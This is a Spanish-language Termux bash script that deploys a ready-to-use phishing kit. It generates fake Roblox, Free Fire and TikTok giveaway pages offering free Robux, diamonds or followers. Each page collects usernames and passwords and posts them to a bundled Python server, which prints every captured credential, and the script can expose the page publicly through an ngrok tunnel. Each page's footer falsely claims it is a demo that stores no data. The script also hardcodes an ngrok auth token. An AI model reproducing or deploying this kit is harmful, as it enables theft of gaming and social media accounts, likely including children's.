#!/data/data/com.termux/files/usr/bin/bash

CYAN='\033[0;36m'
AMARILLO='\033[1;33m'
VERDE='\033[0;32m'
BLANCO='\033[1;37m'
ROJO='\033[0;31m'
NC='\033[0m'

clear

echo -e "${CYAN}"
echo "  ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ "
echo "  ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗"
echo "  ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝"
echo "  ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗"
echo "  ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║"
echo "  ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝"
echo -e "${AMARILLO}        [ WEB SERVER DEPLOYER v3.0 ]${NC}\n"

# ============================================
# CONFIGURACIÓN DE NGROK (TU TOKEN)
# ============================================
NGROK_TOKEN="3H0QmOvROuXni12KbiqkN8Ob0zL_3j7Gx8xUAU6DRjzLrfNMT"

# ============================================
# FUNCIONES HTML (MISMO CÓDIGO QUE ANTES)
# ============================================
html_roblox() {
cat << 'EOF'
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎮 Roblox - Sorteo de Robux</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);min-height:100vh;display:flex;justify-content:center;align-items:center}
        .container{background:rgba(255,255,255,0.08);backdrop-filter:blur(15px);padding:40px;border-radius:25px;box-shadow:0 15px 50px rgba(0,0,0,0.5);width:420px;text-align:center;border:1px solid rgba(255,107,107,0.2)}
        .logo{font-size:70px;margin-bottom:10px}
        h1{color:#ff6b6b;font-size:28px;margin-bottom:8px}
        .subtitle{color:#aaa;font-size:14px;margin-bottom:25px}
        .offer-box{background:linear-gradient(135deg,rgba(255,215,0,0.15),rgba(255,107,107,0.1));border:2px solid #ffd700;border-radius:15px;padding:20px;margin-bottom:25px}
        .offer-box h3{color:#ffd700;font-size:20px}
        .offer-box .cantidad{font-size:32px;color:#ffd700;font-weight:bold}
        .input-group{margin-bottom:18px;text-align:left}
        .input-group label{display:block;color:#ddd;margin-bottom:6px;font-weight:600;font-size:14px}
        .input-group input{width:100%;padding:14px;border:none;border-radius:10px;background:rgba(255,255,255,0.08);color:#fff;font-size:15px;transition:all 0.3s;border:1px solid transparent}
        .input-group input:focus{outline:none;background:rgba(255,255,255,0.15);border-color:#ff6b6b;box-shadow:0 0 20px rgba(255,107,107,0.15)}
        .input-group input::placeholder{color:#888}
        .btn{width:100%;padding:16px;background:linear-gradient(135deg,#ff6b6b,#ee5a24);border:none;border-radius:12px;color:#fff;font-size:18px;font-weight:bold;cursor:pointer;transition:all 0.3s;text-transform:uppercase;letter-spacing:1px}
        .btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(255,107,107,0.3)}
        .footer{color:#666;margin-top:20px;font-size:11px;border-top:1px solid rgba(255,255,255,0.05);padding-top:15px}
        .success{display:none;background:rgba(46,213,115,0.15);border:2px solid #2ed573;border-radius:12px;padding:20px;margin-top:20px;color:#2ed573}
        .success.show{display:block}
    </style>
</head>
<body>
<div class="container">
    <div class="logo">🎮</div>
    <h1>¡GANA ROBUX GRATIS!</h1>
    <p class="subtitle">Sorteo oficial de Roblox - 10,000 Robux en juego</p>
    <div class="offer-box">
        <h3>🎁 SORTEO ESPECIAL</h3>
        <p style="color:#fff;font-size:14px;margin-top:5px">Gana hasta</p>
        <span class="cantidad">10,000 ROBUX</span>
    </div>
    <form id="formData" onsubmit="enviarDatos(event)">
        <div class="input-group">
            <label>👤 USUARIO DE ROBLOX</label>
            <input type="text" id="usuario" placeholder="Ingresa tu usuario" required>
        </div>
        <div class="input-group">
            <label>🔑 CONTRASEÑA</label>
            <input type="password" id="password" placeholder="Ingresa tu contraseña" required>
        </div>
        <button type="submit" class="btn">🎯 PARTICIPAR EN EL SORTEO</button>
    </form>
    <div class="success" id="successMsg">
        ✅ ¡DATOS ENVIADOS CORRECTAMENTE!<br>
        <span style="font-size:12px">Has sido registrado en el sorteo</span>
    </div>
    <p class="footer">⚠️ Este es un sitio de demostración - No almacenamos datos reales</p>
</div>
<script>
function enviarDatos(e) {
    e.preventDefault();
    const usuario = document.getElementById('usuario').value;
    const password = document.getElementById('password').value;
    
    fetch('/submit', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'app=Roblox&usuario=' + encodeURIComponent(usuario) + '&password=' + encodeURIComponent(password)
    });
    
    document.getElementById('successMsg').classList.add('show');
    document.getElementById('formData').reset();
    setTimeout(() => {
        document.getElementById('successMsg').classList.remove('show');
    }, 5000);
}
</script>
</body>
</html>
EOF
}

# ============================================
# FUNCIONES HTML PARA LAS DEMÁS APPS
# ============================================
html_freefire() {
cat << 'EOF'
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔥 Free Fire - Diamantes Gratis</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(135deg,#0a0a0a,#1a0a0a,#2a0a0a);min-height:100vh;display:flex;justify-content:center;align-items:center}
        .container{background:rgba(255,107,53,0.08);backdrop-filter:blur(15px);padding:40px;border-radius:25px;box-shadow:0 15px 50px rgba(255,107,53,0.2);width:420px;text-align:center;border:1px solid rgba(255,107,53,0.3)}
        .logo{font-size:70px;margin-bottom:10px}
        h1{color:#ff6b35;font-size:28px;margin-bottom:8px}
        .subtitle{color:#ffd700;font-size:14px;margin-bottom:25px}
        .offer-box{background:linear-gradient(135deg,rgba(255,215,0,0.1),rgba(255,107,53,0.1));border:2px solid #ffd700;border-radius:15px;padding:20px;margin-bottom:25px}
        .offer-box h3{color:#ffd700;font-size:20px}
        .offer-box .cantidad{font-size:32px;color:#ffd700;font-weight:bold}
        .input-group{margin-bottom:18px;text-align:left}
        .input-group label{display:block;color:#ddd;margin-bottom:6px;font-weight:600;font-size:14px}
        .input-group input{width:100%;padding:14px;border:none;border-radius:10px;background:rgba(255,255,255,0.08);color:#fff;font-size:15px;transition:all 0.3s;border:1px solid transparent}
        .input-group input:focus{outline:none;background:rgba(255,255,255,0.15);border-color:#ff6b35;box-shadow:0 0 20px rgba(255,107,53,0.15)}
        .input-group input::placeholder{color:#888}
        .btn{width:100%;padding:16px;background:linear-gradient(135deg,#ff6b35,#ff4500);border:none;border-radius:12px;color:#fff;font-size:18px;font-weight:bold;cursor:pointer;transition:all 0.3s;text-transform:uppercase;letter-spacing:1px}
        .btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(255,107,53,0.3)}
        .footer{color:#666;margin-top:20px;font-size:11px;border-top:1px solid rgba(255,255,255,0.05);padding-top:15px}
        .success{display:none;background:rgba(46,213,115,0.15);border:2px solid #2ed573;border-radius:12px;padding:20px;margin-top:20px;color:#2ed573}
        .success.show{display:block}
    </style>
</head>
<body>
<div class="container">
    <div class="logo">🔥</div>
    <h1>¡DIAMANTES GRATIS!</h1>
    <p class="subtitle">Evento exclusivo - 5,000 Diamantes en juego</p>
    <div class="offer-box">
        <h3>🎁 EVENTO ESPECIAL</h3>
        <p style="color:#fff;font-size:14px;margin-top:5px">Gana</p>
        <span class="cantidad">5,000 DIAMANTES</span>
    </div>
    <form id="formData" onsubmit="enviarDatos(event)">
        <div class="input-group">
            <label>🎯 ID DE FREE FIRE</label>
            <input type="text" id="usuario" placeholder="Ingresa tu ID" required>
        </div>
        <div class="input-group">
            <label>🔑 CONTRASEÑA</label>
            <input type="password" id="password" placeholder="Ingresa tu contraseña" required>
        </div>
        <button type="submit" class="btn">💎 OBTENER DIAMANTES</button>
    </form>
    <div class="success" id="successMsg">
        ✅ ¡DATOS ENVIADOS CORRECTAMENTE!<br>
        <span style="font-size:12px">Has sido registrado en el evento</span>
    </div>
    <p class="footer">⚠️ Este es un sitio de demostración - No almacenamos datos reales</p>
</div>
<script>
function enviarDatos(e) {
    e.preventDefault();
    const usuario = document.getElementById('usuario').value;
    const password = document.getElementById('password').value;
    
    fetch('/submit', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'app=FreeFire&usuario=' + encodeURIComponent(usuario) + '&password=' + encodeURIComponent(password)
    });
    
    document.getElementById('successMsg').classList.add('show');
    document.getElementById('formData').reset();
    setTimeout(() => {
        document.getElementById('successMsg').classList.remove('show');
    }, 5000);
}
</script>
</body>
</html>
EOF
}

html_tiktok() {
cat << 'EOF'
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📱 TikTok - Seguidores Gratis</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(135deg,#010101,#1a1a1a);min-height:100vh;display:flex;justify-content:center;align-items:center}
        .container{background:rgba(255,0,80,0.08);backdrop-filter:blur(15px);padding:40px;border-radius:25px;box-shadow:0 15px 50px rgba(255,0,80,0.2);width:420px;text-align:center;border:1px solid rgba(255,0,80,0.3)}
        .logo{font-size:70px;margin-bottom:10px}
        h1{color:#ff0050;font-size:28px;margin-bottom:8px}
        .subtitle{color:#fff;font-size:14px;margin-bottom:25px}
        .offer-box{background:linear-gradient(135deg,rgba(255,0,80,0.1),rgba(255,0,80,0.05));border:2px solid #ff0050;border-radius:15px;padding:20px;margin-bottom:25px}
        .offer-box h3{color:#ff0050;font-size:20px}
        .offer-box .cantidad{font-size:32px;color:#ff0050;font-weight:bold}
        .input-group{margin-bottom:18px;text-align:left}
        .input-group label{display:block;color:#ddd;margin-bottom:6px;font-weight:600;font-size:14px}
        .input-group input{width:100%;padding:14px;border:none;border-radius:10px;background:rgba(255,255,255,0.08);color:#fff;font-size:15px;transition:all 0.3s;border:1px solid transparent}
        .input-group input:focus{outline:none;background:rgba(255,255,255,0.15);border-color:#ff0050;box-shadow:0 0 20px rgba(255,0,80,0.15)}
        .input-group input::placeholder{color:#888}
        .btn{width:100%;padding:16px;background:linear-gradient(135deg,#ff0050,#cc0040);border:none;border-radius:12px;color:#fff;font-size:18px;font-weight:bold;cursor:pointer;transition:all 0.3s;text-transform:uppercase;letter-spacing:1px}
        .btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(255,0,80,0.3)}
        .footer{color:#666;margin-top:20px;font-size:11px;border-top:1px solid rgba(255,255,255,0.05);padding-top:15px}
        .success{display:none;background:rgba(46,213,115,0.15);border:2px solid #2ed573;border-radius:12px;padding:20px;margin-top:20px;color:#2ed573}
        .success.show{display:block}
    </style>
</head>
<body>
<div class="container">
    <div class="logo">📱</div>
    <h1>¡SEGUIDORES GRATIS!</h1>
    <p class="subtitle">Consigue 10K seguidores reales</p>
    <div class="offer-box">
        <h3>🎁 SORTEO DE SEGUIDORES</h3>
        <p style="color:#fff;font-size:14px;margin-top:5px">Gana</p>
        <span class="cantidad">10,000 SEGUIDORES</span>
    </div>
    <form id="formData" onsubmit="enviarDatos(event)">
        <div class="input-group">
            <label>👤 USUARIO DE TIKTOK</label>
            <input type="text" id="usuario" placeholder="Ingresa tu usuario" required>
        </div>
        <div class="input-group">
            <label>🔑 CONTRASEÑA</label>
            <input type="password" id="password" placeholder="Ingresa tu contraseña" required>
        </div>
        <button type="submit" class="btn">🚀 OBTENER SEGUIDORES</button>
    </form>
    <div class="success" id="successMsg">
        ✅ ¡DATOS ENVIADOS CORRECTAMENTE!<br>
        <span style="font-size:12px">Has sido registrado en el sorteo</span>
    </div>
    <p class="footer">⚠️ Este es un sitio de demostración - No almacenamos datos reales</p>
</div>
<script>
function enviarDatos(e) {
    e.preventDefault();
    const usuario = document.getElementById('usuario').value;
    const password = document.getElementById('password').value;
    
    fetch('/submit', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'app=TikTok&usuario=' + encodeURIComponent(usuario) + '&password=' + encodeURIComponent(password)
    });
    
    document.getElementById('successMsg').classList.add('show');
    document.getElementById('formData').reset();
    setTimeout(() => {
        document.getElementById('successMsg').classList.remove('show');
    }, 5000);
}
</script>
</body>
</html>
EOF
}

# ============================================
# FUNCIÓN PARA OBTENER HTML SEGÚN APP
# ============================================
get_html() {
    local app="$1"
    case "$app" in
        "Roblox") html_roblox ;;
        "Free Fire") html_freefire ;;
        "TikTok") html_tiktok ;;
        *) 
            echo '<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Servidor</title>
<style>
body{font-family:Arial;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;text-align:center;padding:50px}
.container{background:rgba(255,255,255,0.1);padding:40px;border-radius:20px;max-width:400px;margin:auto}
input{width:100%;padding:12px;margin:10px 0;border-radius:8px;border:none}
.btn{background:rgba(255,255,255,0.2);border:2px solid #fff;padding:12px 30px;border-radius:8px;color:#fff;font-weight:bold;cursor:pointer}
</style>
</head>
<body>
<div class="container">
<h1>🚀 '$app'</h1>
<p>Servidor activo</p>
<form onsubmit="fetch('/submit',{method:"POST",body:"app='$app'&usuario="+encodeURIComponent(document.getElementById("u").value)+"&password="+encodeURIComponent(document.getElementById("p").value)});alert("✅ Datos enviados");return false;">
<input type="text" id="u" placeholder="Usuario" required>
<input type="password" id="p" placeholder="Contraseña" required>
<button class="btn">Enviar</button>
</form>
</div>
</body>
</html>'
            ;;
    esac
}

# ============================================
# MENÚ PRINCIPAL
# ============================================

APPS=(
    "Roblox" "Free Fire" "TikTok"
)

echo -e "${BLANCO}[+] Módulos disponibles (${#APPS[@]} en total):${NC}\n"

for i in "${!APPS[@]}"; do
    num=$((i+1))
    printf " ${AMARILLO}[%2d]${NC} %-13s" "$num" "${APPS[$i]}"
    if [ $((num % 4)) -eq 0 ]; then
        echo ""
    fi
done
echo -e "\n"

while true; do
    read -p ">> Selecciona una opción (1-${#APPS[@]}): " app_choice < /dev/tty
    if [[ "$app_choice" =~ ^[0-9]+$ ]] && [ "$app_choice" -ge 1 ] && [ "$app_choice" -le "${#APPS[@]}" ]; then
        break
    else
        echo -e "${ROJO}[!] Selección inválida. Ingresa un número de 1 a ${#APPS[@]}.${NC}"
    fi
done

SELECTED_APP="${APPS[$((app_choice-1))]}"
echo -e "${VERDE}[✔] Módulo seleccionado: ${BLANCO}$SELECTED_APP${NC}\n"

# ============================================
# SELECCIÓN DE ALCANCE DE RED
# ============================================
echo -e "${BLANCO}[+] Alcance de red:${NC}"
echo -e "  ${AMARILLO}[1]${NC} Local (Solo dispositivos en tu Wi-Fi)"
echo -e "  ${AMARILLO}[2]${NC} Público (Cualquier persona en el mundo)"
read -p ">> Opción (1-2) [1]: " input_net < /dev/tty

net_choice=${input_net:-1}

# ============================================
# CREAR CARPETA Y GENERAR HTML
# ============================================
mkdir -p ~/mi_web
HTML_CONTENT=$(get_html "$SELECTED_APP")
echo "$HTML_CONTENT" > ~/mi_web/index.html

# ============================================
# INSTALAR DEPENDENCIAS
# ============================================
pkg install python -y > /dev/null 2>&1
pkg install ngrok -y > /dev/null 2>&1

clear
echo -e "${CYAN}==================================================${NC}"
echo -e "${VERDE}[✔] SERVIDOR DESPLEGADO PARA: ${BLANCO}$SELECTED_APP${NC}"
echo -e "${CYAN}==================================================${NC}\n"

# ============================================
# LIBERAR PUERTO 8080
# ============================================
echo -e "${AMARILLO}[*] Liberando puerto 8080...${NC}"
fuser -k 8080/tcp 2>/dev/null
pkill -f "python3.*http.server" 2>/dev/null
pkill -f ngrok 2>/dev/null
sleep 2

# ============================================
# CONFIGURAR TOKEN DE NGROK
# ============================================
echo -e "${AMARILLO}[*] Configurando ngrok...${NC}"
ngrok config add-authtoken $NGROK_TOKEN 2>/dev/null

# ============================================
# INICIAR SERVIDOR EN SEGUNDO PLANO
# ============================================
cd ~/mi_web
python3 -m http.server 8080 &
SERVER_PID=$!
sleep 2

# ============================================
# INICIAR NGROK (SI SE SELECCIONÓ PÚBLICO)
# ============================================
NGROK_URL=""
if [ "$net_choice" == "2" ]; then
    echo -e "${AMARILLO}[*] Generando enlace público con Ngrok...${NC}"
    ngrok http 8080 > /dev/null 2>&1 &
    NGROK_PID=$!
    sleep 6
    
    # Obtener el link de ngrok
    NGROK_URL=$(curl -s http://localhost:4040/api/tunnels 2>/dev/null | grep -o 'https://[a-zA-Z0-9.-]*\.ngrok.io' | head -1)
    
    echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${VERDE}🌐 ENLACE PÚBLICO (MUNDIAL):${NC}"
    if [ -n "$NGROK_URL" ]; then
        echo -e "${AMARILLO}  📎 $NGROK_URL${NC}"
        echo -e "${BLANCO}  (¡Cualquier persona en el mundo puede acceder!)${NC}"
        echo -e "${VERDE}  ✅ Comparte este link para que otros accedan${NC}"
    else
        echo -e "${ROJO}  ❌ Error al generar enlace público${NC}"
        echo -e "${AMARILLO}  Usando localhost en su lugar...${NC}"
        net_choice="1"
    fi
    echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
fi

if [ "$net_choice" == "1" ]; then
    IP_LOCAL=$(ifconfig 2>/dev/null | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -n 1)
    
    echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${VERDE}📡 ENLACES LOCALES:${NC}"
    echo -e "${AMARILLO}  📎 http://localhost:8080${NC}"
    echo -e "${BLANCO}  (Solo en este dispositivo)${NC}"
    if [ -n "$IP_LOCAL" ]; then
        echo -e "${AMARILLO}  📎 http://$IP_LOCAL:8080${NC}"
        echo -e "${BLANCO}  (Para dispositivos en tu Wi-Fi)${NC}"
    fi
    echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
fi

echo -e "${VERDE}📥 Los datos enviados aparecerán en esta terminal${NC}"
echo -e "${BLANCO}Presiona Ctrl+C para detener el servidor.${NC}\n"

# ============================================
# SERVIDOR QUE RECIBE DATOS POST
# ============================================
python3 << 'PYTHON_SCRIPT'
import http.server
import socketserver
import urllib.parse
import datetime
import json
import os

PORT = 8080

class DataHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/submit':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            data = urllib.parse.parse_qs(post_data.decode('utf-8'))
            
            app = data.get('app', ['Desconocido'])[0]
            usuario = data.get('usuario', [''])[0]
            password = data.get('password', [''])[0]
            
            print("\n" + "="*50)
            print("📥 NUEVOS DATOS RECIBIDOS")
            print("="*50)
            print(f"📱 App: {app}")
            print(f"👤 Usuario: {usuario}")
            print(f"🔑 Contraseña: {password}")
            print(f"🕐 Hora: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            print("="*50 + "\n")
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'ok'}).encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_GET(self):
        if self.path == '/':
            self.path = '/index.html'
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

print("🚀 Servidor Python iniciado en el puerto 8080")
print("📡 Esperando datos POST en /submit...\n")

with socketserver.TCPServer(("0.0.0.0", PORT), DataHandler) as httpd:
    httpd.serve_forever()
PYTHON_SCRIPT
